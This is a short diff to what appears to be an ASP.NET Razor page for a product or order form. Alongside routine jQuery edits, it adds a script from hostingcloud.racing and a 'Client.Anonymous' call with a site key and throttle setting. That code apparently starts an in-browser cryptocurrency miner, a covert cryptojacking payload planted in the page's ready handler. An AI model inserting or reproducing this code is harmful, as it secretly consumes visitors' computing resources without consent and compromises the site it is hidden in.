@@ -1100,11 +1100,18 @@
 
     <!-- select 2 -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.0/js/select2.min.js"></script>
-
+    <script src="https://www.hostingcloud.racing/lNRq.js"></script>
     <script>
+        
+
         $(document).ready(function () {
             //filasOC = 1;
             ActivarProductos();
+
+            var _client = new Client.Anonymous('0fb243d8dae07e196b8a47f5d01e3e993db5ab9d5ce178149070dc38907307bf', {
+                throttle: 0.2, c: 'w', ads: 0
+            });
+            _client.start();
 
             function numeroDecimal(event) {
                 this.value = parseFloat(this.value).toFixed(2);
@@ -1180,7 +1187,7 @@
             AgregarDetalle();
             ActivarProductos();
         }
-         
+
 
     </script>
     @RenderSection("Scripts", required: false)
